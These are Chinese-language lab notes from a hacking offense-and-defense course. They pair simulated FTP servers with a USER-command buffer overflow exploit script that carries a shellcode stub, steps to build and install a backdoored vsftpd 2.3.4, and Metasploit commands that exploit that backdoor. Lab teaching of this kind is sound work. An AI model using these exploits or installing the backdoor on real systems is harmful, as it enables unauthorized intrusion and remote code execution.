# 進階駭客攻防 0409 notes

[TOC]

## 1. FTP 緩衝區溢出 (Buffer Overflow) 攻擊與伺服器崩潰測試

### 參考資料：CVE 內容
- WarFTP 1.65：​存在於 WarFTP 1.65 版本中的 USER 命令遠程緩衝區溢出漏洞，已被分配 [CVE-2007-1567](https://nvd.nist.gov/vuln/detail/CVE-2007-1567)。 
- PCMan's FTP Server 2.0.7：​在 PCMan's FTP Server 2.0.7 版本中，USER 命令存在緩衝區溢出漏洞，允許遠程攻擊者執行任意代碼，已被分配 [CVE-2013-4730](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4730)。
- FreeFloat FTP Server 1.0：​該版本的 FTP 伺服器在處理 USER 命令時存在緩衝區溢出漏洞，允許遠程攻擊者執行任意代碼，已被分配 [CVE-2012-5106](https://nvd.nist.gov/vuln/detail/CVE-2012-5106)。

### 藍方

#### 1. 建立 FTP 服務

```python
import socket
import threading

# 伺服器參數
HOST = '0.0.0.0'  # 允許來自任何 IP 的連接
PORT = 21  # FTP 預設端口

# 處理客戶端連線的函數
def handle_client(client_socket, client_address):
    print(f"[+] 來自 {client_address} 的連線")

    # 發送歡迎訊息
    client_socket.send(b"220 FTP Server Ready\r\n")

    while True:
        try:
            # 接收客戶端數據
            data = client_socket.recv(1024)
            if not data:
                break

            print(f"[*] 接收數據: {data.decode(errors='ignore')}")

            # 檢查是否是 USER 命令
            if data.startswith(b"USER"):
                client_socket.send(b"331 User name okay, need password.\r\n")

            # 檢查是否是 PASS 命令
            elif data.startswith(b"PASS"):
                client_socket.send(b"230 Login successful.\r\n")
                break  # 成功後關閉連接

            else:
                client_socket.send(b"500 Unknown command.\r\n")

        except Exception as e:
            print(f"[-] 錯誤: {e}")
            break

    client_socket.close()
    print(f"[-] 與 {client_address} 的連線已關閉")


def start_server():
    # 創建 socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)  # 允許最多 5 個連接等待

    print(f"[+] 伺服器已啟動，正在監聽 {HOST}:{PORT} ...")

    while True:
        client_socket, client_address = server.accept()
        # 使用多線程處理每個客戶端
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_handler.start()


if __name__ == "__main__":
    start_server()
```

#### 2. 模擬有風險的 FTP 服務

```python
import socket
import threading
import struct

# 伺服器設定
HOST = '0.0.0.0'
PORT = 21  # FTP 標準埠

# 模擬緩衝區（脆弱伺服器）
BUFFER_SIZE = 512  # 設定小的緩衝區，容易產生溢出
vulnerable_buffer = bytearray(BUFFER_SIZE)

# 🛠️ 處理客戶端連線
def handle_client(client_socket, client_address):
    print(f"[+] 來自 {client_address} 的連線")

    # 發送 FTP 服務訊息
    client_socket.send(b"220 Vulnerable FTP Server Ready\r\n")

    try:
        # 接收 `USER` 命令
        data = client_socket.recv(1024)
        print(f"[*] 接收到: {data.decode(errors='ignore')}")

        # 確認 `USER` 命令
        if data.startswith(b"USER"):
            payload = data[5:].strip()  # 提取 `USER` 後面的資料
            
            # 模擬將 `USER` 傳入有漏洞的緩衝區
            if len(payload) > BUFFER_SIZE:
                print("[-] 發生緩衝區溢出！")

                # 💥 模擬崩潰 - 強制寫入異常位址
                crash_address = struct.pack("<I", 0x41414141)  # 寫入 `AAAA`
                vulnerable_buffer[:len(payload)] = payload  # 可能導致溢出
                vulnerable_buffer[-4:] = crash_address  # 覆蓋返回位址

                # 💥 模擬程式崩潰
                raise Exception("模擬伺服器崩潰！")

            client_socket.send(b"331 User name okay, need password.\r\n")
        
        # `PASS` 命令
        elif data.startswith(b"PASS"):
            client_socket.send(b"230 Login successful.\r\n")

        else:
            client_socket.send(b"500 Unknown command.\r\n")

    except Exception as e:
        print(f"[-] 伺服器崩潰: {e}")
        client_socket.close()
        return

    client_socket.close()
    print(f"[-] 與 {client_address} 的連線已關閉")

# 啟動伺服器
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[+] FTP 伺服器啟動，監聽 {HOST}:{PORT} ...")

    while True:
        client_socket, client_address = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_handler.start()

if __name__ == "__main__":
    start_server()
```

### 紅方

#### 一般連線方式

```python
import socket

# 伺服器 IP 與埠號
SERVER_IP = '127.0.0.1'  # 本地測試可用 127.0.0.1
SERVER_PORT = 21  # FTP 標準埠

def ftp_client():
    try:
        # 創建 Socket 連線
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))
        print(f"[+] 連線到 FTP 伺服器 {SERVER_IP}:{SERVER_PORT}")

        # 接收 FTP 伺服器的回應
        response = s.recv(1024)
        print(f"伺服器回應: {response.decode(errors='ignore')}")

        # 傳送 USER 命令（正常用戶名稱）
        user_command = "USER testuser\r\n"
        s.send(user_command.encode())
        response = s.recv(1024)
        print(f"伺服器回應: {response.decode(errors='ignore')}")

        # 傳送 PASS 命令（密碼）
        pass_command = "PASS testpassword\r\n"
        s.send(pass_command.encode())
        response = s.recv(1024)
        print(f"伺服器回應: {response.decode(errors='ignore')}")

        # 關閉連線
        s.close()
        print("[-] 與伺服器的連線已關閉")

    except Exception as e:
        print(f"[!] 連線錯誤: {e}")

if __name__ == "__main__":
    ftp_client()
```

#### 溢位的連線方式

```python
#!/usr/bin/python3
import socket

# Shellcode (示範用途，需自行更換為適用目標的 shellcode)
shellcode = (b"\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +
             b"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\xb2\xdb\x61\x30" +
             b"\x09\x0e\xd0\x2b")

# 建構 Exploit Buffer
buffer = b"A" * 485 + b"\x59\x54\xc3\x77" + b"C" * 4 + b"\x81\xc4\x24\xfa\xff\xff" + shellcode

# 連線到目標 FTP 伺服器
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.20.10', 21))

# 接收伺服器回應
response = s.recv(1024)
print(response.decode(errors='ignore'))

# 傳送 Exploit `USER` 命令
s.send(b'USER ' + buffer + b'\r\n')
response = s.recv(1024)
print(response.decode(errors='ignore'))

# 傳送 `PASS` 命令
s.send(b'PASS PASSWORD\r\n')
s.close()
```

---

## 2. 使用 MSFvenom 爆破 vsFTPd v2.3.4

### 參考資料

1. https://security.appspot.com/downloads/vsftpd-2.3.4.tar.gz
2. https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
3. [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)

### 藍方

#### 1. 安裝有後門版本的 vsFTPd v2.3.4

```bash
git clone https://github.com/nikdubois/vsftpd-2.3.4-infected
cd vsftpd-2.3.4-infected

sudo apt-get update
sudo apt-get install libcrypt-dev libcap-dev
sudo mkdir -p /usr/local/man/man8
sudo mkdir -p /usr/local/man/man5
chmod a+x vsf_findlibs.sh
```

#### 2. 修改程式 `mousepad str.c`

```cpp
#include "sysdeputil.h"
```

#### 2a. 新增定義到 sysdeputil.h

- 打開 `sysdeputil.h`
```bash
mousepad sysdeputil.h
```
- 在第 75 行新增以下定義
```c
int vsf_sysutil_extra();
```

#### 3. 修改 Makefile `mousepad vsf_findlibs.sh`, 在第 74 行

```bash
echo "-lcrypt -lcap";
```

#### 4. 編譯並安裝

```bash
make
sudo make install                       
```

#### 5. 加入設定檔

```bash
echo -e "listen=YES\nanonymous_enable=YES\nlocal_enable=YES\nwrite_enable=YES" | sudo tee -a /etc/vsftpd.conf > /dev/null
```

#### 6. 加入專用帳號

```bash
sudo useradd -m -d /usr/share/empty -s /usr/sbin/nologin ftp
```

#### 7. 運行程式

```bash
sudo /usr/local/sbin/vsftpd /etc/vsftpd.conf
```

### 紅方 (使用 Metasploit)

Metasploit 是一個強大的開源框架，用於進行滲透測試和漏洞利用。以下是一個簡單的範例，展示如何使用 Metasploit 利用已知的漏洞來獲取目標系統的訪問權限。

1. 運行 `msfconsole`
2. 搜尋 vsftpd
3. `use 1`
4. `set RHOST 192.168.68.55` (請使用 `ip a` 確認你的 kali 所在位置)
5. `show options`
6. `run`

---

